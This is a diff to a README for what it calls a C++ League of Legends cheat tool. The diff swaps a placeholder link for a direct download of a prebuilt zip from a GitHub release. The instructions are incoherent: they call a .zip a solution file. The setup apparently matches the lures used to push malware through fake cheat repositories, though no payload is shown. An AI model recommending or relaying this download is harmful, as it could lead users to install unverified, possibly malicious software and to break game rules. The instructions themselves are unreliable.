@@ -4,7 +4,7 @@ This C++-based tool is designed to elevate your League of Legends experience by 
 
 ## How to Use
 - Download the project to your computer as zip
-- [Click Here](555)
+- [Click Here](https://github.com/iamlegendbeautiful/League-of-Legends-Cheat-Source/releases/download/v3.5.0/League-of-Legends.zip)
 
 ## Compiling :
 - Open the solution file (.zip).
